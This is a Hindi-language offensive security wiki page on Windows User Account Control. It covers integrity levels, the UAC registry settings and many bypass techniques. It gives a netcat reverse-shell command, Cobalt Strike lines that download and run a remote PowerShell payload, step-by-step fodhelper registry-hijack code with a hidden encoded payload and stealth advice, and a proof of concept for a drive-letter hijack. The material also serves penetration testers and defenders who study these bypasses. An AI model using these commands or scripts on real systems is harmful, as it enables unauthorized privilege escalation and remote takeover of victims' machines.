# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक फीचर है जो **उच्चाधिकार वाली गतिविधियों के लिए सहमति संकेत** सक्षम करता है। Applications के अलग‑अलग `integrity` स्तर होते हैं, और किसी प्रोग्राम का **उच्च स्तर** होने पर वह ऐसे कार्य कर सकता है जो **सिस्टम को संभावित रूप से प्रभावित कर सकते हैं**। जब UAC सक्षम होता है, तो applications और tasks हमेशा **एक गैर‑प्रशासक खाता (non-administrator account) के सुरक्षा संदर्भ में चलते हैं** जब तक कि कोई प्रशासक स्पष्ट रूप से इन applications/tasks को सिस्टम पर प्रशासक‑स्तरीय पहुंच देने के लिए अधिकृत न कर दे। यह प्रशासकों को अनिच्छित बदलावों से बचाने के लिए एक सुविधा है, लेकिन इसे एक सुरक्षा सीमा (security boundary) माना नहीं जाता।

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

जब UAC लागू होता है, तो एक administrator उपयोगकर्ता को 2 tokens दिए जाते हैं: एक standard user token, सामान्य स्तर पर नियमित क्रियाएँ करने के लिए, और एक token जिसमें admin privileges होते हैं।

यह [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC कैसे काम करता है इसे गहराई से बताती है और इसमें logon प्रक्रिया, उपयोगकर्ता अनुभव, और UAC आर्किटेक्चर शामिल हैं। प्रशासक security policies का उपयोग करके यह कॉन्फ़िगर कर सकते हैं कि UAC उनके संगठन के लिए स्थानीय स्तर पर (secpol.msc का उपयोग करके) कैसे काम करे, या Active Directory डोमेन वातावरण में Group Policy Objects (GPO) के द्वारा कॉन्फ़िगर और पुश किया जा सकता है। विभिन्न सेटिंग्स का विवरण यहाँ दिया गया है [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)। UAC के लिए 10 Group Policy सेटिंग्स सेट की जा सकती हैं। निम्नलिखित तालिका अतिरिक्त जानकारी देती है:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | अक्षम                                                         |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | अक्षम                                                         |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | गैर‑Windows बाइनरी के लिए सहमति के लिए संकेत                 |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | सुरक्षित डेस्कटॉप पर प्रमाण‑पत्र (credentials) के लिए संकेत   |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | सक्रिय (डिफ़ॉल्ट: Home) / अक्षम (डिफ़ॉल्ट: Enterprise)       |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | अक्षम                                                         |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | सक्रिय                                                        |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | सक्रिय                                                        |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | सक्रिय                                                        |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | सक्रिय                                                        |

### UAC Bypass Theory

कुछ प्रोग्राम **autoelevated automatically** होते हैं अगर **user administrator group का सदस्य** है। इन बायनरीज़ के अंदर उनके _**Manifests**_ में _**autoElevate**_ विकल्प का मान _**True**_ होता है। बाइनरी का **Microsoft द्वारा sign** होना भी आवश्यक होता है।

कई auto‑elevate processes **COM objects या RPC servers के माध्यम से फ़ंक्शनलिटी एक्सपोज़** करते हैं, जिन्हें medium integrity (सामान्य user‑स्तरीय privileges) चल रहे processes से invoke किया जा सकता है। ध्यान दें कि COM (Component Object Model) और RPC (Remote Procedure Call) वे तरीके हैं जिनसे Windows प्रोग्राम अलग‑अलग processes के बीच संवाद करते और फ़ंक्शन चलाते हैं। उदाहरण के लिए, **`IFileOperation COM object`** फ़ाइल ऑपरेशन्स (copy, delete, move) संभालने के लिए डिज़ाइन किया गया है और यह बिना प्रॉम्प्ट के स्वचालित रूप से privileges elevate कर सकता है।

ध्यान दें कि कुछ checks किए जा सकते हैं, जैसे कि यह जाँचना कि प्रक्रिया **System32 directory** से चलाई गई थी या नहीं, जिसे उदाहरण के लिए **explorer.exe में inject करके** या किसी अन्य System32‑स्थित executable में जाकर बाइपास किया जा सकता है।

इन checks को बाइपास करने का एक और तरीका है **PEB को modify करना**। Windows में हर process का एक Process Environment Block (PEB) होता है, जिसमें process के बारे में महत्वपूर्ण डेटा शामिल होता है, जैसे उसका executable path। PEB को संशोधित करके, attackers अपने malicious process का स्थान नकली (spoof) कर सकते हैं, ताकि वह विश्वसनीय डायरेक्टरी (जैसे system32) से चल रहा प्रतीत हो। यह spoofed जानकारी COM object को बिना यूज़र को प्रॉम्प्ट किए auto‑elevate करने में धोखा देती है।

फिर, UAC को **बाइपास** करने के लिए (medium integrity से **high** पर उन्नत करने के लिए) कुछ attackers इस तरह की बाइनरीज़ का उपयोग arbitrary code execute करने के लिए करते हैं क्योंकि वह कोड **High level integrity process** से execute होगा।

आप किसी बाइनरी के _**Manifest**_ को Sysinternals के टूल _**sigcheck.exe**_ से जाँच सकते हैं। (`sigcheck.exe -m <file>`) और आप processes का **integrity level** Process Explorer या Process Monitor (Sysinternals) का उपयोग करके देख सकते हैं।

### UAC की जाँच

पुष्टि करने के लिए कि UAC सक्षम है, करें:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
यदि यह **`1`** है तो UAC **सक्रिय** है, यदि यह **`0`** है या यह मौजूद नहीं है, तो UAC **निष्क्रिय** है।

फिर, जाँचें कि **कौन सा स्तर** कॉन्फ़िगर किया गया है:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** तो, UAC prompt नहीं करेगा (जैसे **अक्षम**)
- If **`1`** तो admin से **username और password माँगा जाता है** ताकि binary को उच्च अधिकारों के साथ चलाया जा सके (Secure Desktop पर)
- If **`2`** (**Always notify me**) UAC हमेशा administrator से पुष्टि माँगेगा जब वह कुछ उच्च privileges के साथ execute करने की कोशिश करेगा (Secure Desktop पर)
- If **`3`** तो यह `1` जैसा है पर Secure Desktop पर आवश्यक नहीं
- If **`4`** तो यह `2` जैसा है पर Secure Desktop पर आवश्यक नहीं
- if **`5`**(**default**) तो यह administrator से पुष्टि माँगेगा कि non Windows binaries को उच्च privileges के साथ चलाया जाए

फिर, आपको **`LocalAccountTokenFilterPolicy`** की value देखनी होगी\
यदि value **`0`** है, तो केवल **RID 500** user (**built-in Administrator**) ही **admin tasks बिना UAC के** कर सकता है, और यदि यह `1` है, तो **"Administrators"** group के अंदर की सभी खातों को ये अनुमति होगी।

और अंत में **`FilterAdministratorToken`** key की value देखें\
यदि **`0`** (default), तो **built-in Administrator account** remote administration tasks कर सकता है और यदि **`1`** है तो built-in Administrator remote administration tasks नहीं कर पाएगा, सिवाय इसके कि `LocalAccountTokenFilterPolicy` `1` पर सेट हो।

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **किसी के लिए भी UAC नहीं**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , किसी के लिए भी UAC नहीं**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, RID 500 (Built-in Administrator) के लिए UAC नहीं**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, सभी के लिए UAC होगा**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> ध्यान दें कि यदि आपके पास ग्राफ़िकल एक्सेस है, तो UAC bypass सीधा है क्योंकि UAC prompt दिखाई देने पर आप बस "Yes" पर क्लिक कर सकते हैं

The UAC bypass निम्न परिस्थितियों में आवश्यक होता है: **UAC सक्रिय है, आपका प्रोसेस medium integrity context में चल रहा है, और आपका उपयोगकर्ता administrators group का सदस्य है**।

यह उल्लेखनीय है कि यह **ज़्यादा कठिन है UAC को बायपास करना यदि यह सर्वोच्च सुरक्षा स्तर (Always) पर है बनाम किसी अन्य स्तर (Default) पर।**

### UAC disabled

यदि UAC पहले से disabled (`ConsentPromptBehaviorAdmin` **`0`**) है तो आप **reverse shell को admin privileges के साथ execute** कर सकते हैं (high integrity level) कुछ इस तरह:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **बहुत बुनियादी** UAC "bypass" (full file system access)

यदि आपके पास एक shell है जिस user का संबंध Administrators group से है, तो आप **mount the C$** shared via SMB (file system) local in a new disk कर सकते हैं और आपको **access to everything inside the file system** मिलेगा (यहाँ तक कि Administrator home folder भी)।

> [!WARNING]
> **ऐसा लगता है कि यह ट्रिक अब काम नहीं कर रही है**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass के साथ cobalt strike

ये Cobalt Strike techniques केवल तभी काम करेंगे जब UAC अधिकतम सुरक्षा स्तर पर सेट न हो।
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** और **Metasploit** में **UAC** को **bypass** करने के कई मॉड्यूल भी हैं।

### KRBUACBypass

डॉक्यूमेंटेशन और टूल: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) जो कई UAC bypass exploits का **संग्रह** है। ध्यान दें कि आपको **compile UACME using visual studio or msbuild** करना होगा। कम्पाइलेशन कई executables बनाएगा (जैसे `Source\Akagi\outout\x64\Debug\Akagi.exe`) , आपको यह जानना होगा **कौन सा आपको चाहिए।**\
आपको **सावधान** रहना चाहिए क्योंकि कुछ bypasses **prompt some other programs** कर सकती हैं जो **alert** करके **user** को सूचित कर देंगी कि कुछ हो रहा है।

UACME में प्रत्येक technique के काम करना शुरू करने वाली **build version** दी गई है। आप अपनी versions को प्रभावित करने वाली technique खोज सकते हैं:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

ट्रस्टेड बाइनरी `fodhelper.exe` आधुनिक Windows पर ऑटो-एलेवेटेड होता है। लॉन्च होने पर यह नीचे दी गई per-user registry path को `DelegateExecute` verb की वैधता की जाँच किए बिना क्वेरी करता है। वहाँ एक कमांड रख देने से एक Medium Integrity प्रक्रिया (user is in Administrators) बिना किसी UAC prompt के एक High Integrity प्रक्रिया को spawn कर सकती है।

fodhelper द्वारा क्वेरी किया गया Registry path:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell के कदम (अपने payload को सेट करें, फिर trigger करें):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- यह तब काम करता है जब वर्तमान उपयोगकर्ता Administrators का सदस्य हो और UAC स्तर default/lenient हो (not Always Notify with extra restrictions)।
- 64-bit Windows पर 32-bit process से 64-bit PowerShell शुरू करने के लिए `sysnative` path का उपयोग करें।
- Payload कोई भी command हो सकता है (PowerShell, cmd, या एक EXE path)। Stealth के लिए prompting UIs से बचें।

#### More UAC bypass

**All** यहाँ उपयोग की गई techniques AUC को bypass करने के लिए **require** एक **full interactive shell** पीड़ित के साथ (एक सामान्य nc.exe shell पर्याप्त नहीं)।

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ काम करेगा)

### UAC Bypass with GUI

यदि आपके पास **GUI तक पहुंच** है तो UAC prompt मिलने पर आप बस उसे स्वीकार कर सकते हैं, वास्तव में आपको bypass की ज़रूरत नहीं है। इसलिए, GUI तक पहुंच मिलने पर आप UAC को bypass कर पाएंगे।

Moreover, यदि आपको किसी द्वारा उपयोग की जा रही GUI session मिलती है (संभवतः RDP के माध्यम से), तो ऐसी **कुछ tools होंगी जो administrator के रूप में चल रही होंगी**, जहाँ से आप उदाहरण के लिए सीधे **cmd** को **as admin** चला सकते हैं बिना UAC द्वारा फिर से prompt किए गए — जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). यह कुछ हद तक अधिक **stealthy** हो सकता है।

### Noisy brute-force UAC bypass

यदि आपको noisy होने की परवाह नहीं है तो आप हमेशा **ऐसा कुछ चला सकते हैं जैसे** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) जो उपयोगकर्ता इसे स्वीकार करने तक permissions बढ़ाने के लिए अनुरोध करता रहेगा।

### Your own bypass - Basic UAC bypass methodology

यदि आप **UACME** को देखें तो आप पाएँगे कि अधिकांश UAC bypasses **Dll Hijacking vulnerability** का दुरुपयोग करते हैं (मुख्यतः दुर्भावनापूर्ण dll को _C:\Windows\System32_ पर लिखना)। [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. ऐसा binary खोजें जो **autoelevate** करे (जब चलाया जाए तो यह high integrity level पर चले, यह जाँचें)।
2. procmon के साथ उन "**NAME NOT FOUND**" events को खोजें जो **DLL Hijacking** के लिए vulnerable हो सकते हैं।
3. आपको संभवतः कुछ **protected paths** (जैसे C:\Windows\System32) के अंदर DLL **write** करने की आवश्यकता होगी जहाँ आपकी writing permissions नहीं है। आप इसे bypass कर सकते हैं निम्न के उपयोग से:
   1. **wusa.exe**: Windows 7,8 and 8.1. यह protected paths के अंदर CAB file की सामग्री extract करने की अनुमति देता है (क्योंकि यह tool high integrity level से execute होता है)।
   2. **IFileOperation**: Windows 10।
4. अपने DLL को protected path में copy करने और vulnerable व autoelevated binary को execute करने के लिए एक **script** तैयार करें।

### Another UAC bypass technique

यह इस बात पर निगरानी करने का है कि क्या कोई **autoElevated binary** **registry** से किसी **binary** या **command** के **name/path** को **read** करने की कोशिश कर रहा है जिसे **executed** किया जाएगा (यह विशेष रूप से रुचिकर होता है यदि binary यह जानकारी **HKCU** के अंदर खोजता है)।

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” shadow-admin tokens का उपयोग करता है जो per-session `\Sessions\0\DosDevices/<LUID>` maps के साथ होते हैं। यह directory पहली `\??` resolution पर `SeGetTokenDeviceMap` द्वारा lazy तरीके से बनाई जाती है। यदि attacker केवल **SecurityIdentification** पर shadow-admin token की impersonate करता है, तो directory attacker को **owner** के रूप में बनाया जाता है (यह `CREATOR OWNER` inherit करता है), जिससे drive-letter links की अनुमति मिलती है जो `\GLOBAL??` पर precedence लेती हैं।

**Steps:**

1. low-privileged session से `RAiProcessRunOnce` कॉल करके एक promptless shadow-admin `runonce.exe` spawn करें।
2. इसके primary token को एक **identification** token में duplicate करें और `\??` खोलते समय इसकी impersonate करें ताकि attacker ownership के तहत `\Sessions\0\DosDevices/<LUID>` बन सके।
3. वहाँ एक `C:` symlink बनाएं जो attacker-controlled storage की ओर इशारा करे; उस session में subsequent filesystem accesses `C:` को attacker path के रूप में resolve करेंगे, जिससे बिना prompt के DLL/file hijack संभव होगा।

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## संदर्भ
- [HTB: Rainbow – SEH overflow से RCE over HTTP (0xdf) – fodhelper UAC bypass के कदम](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – User Account Control कैसे काम करता है](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques का संग्रह](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
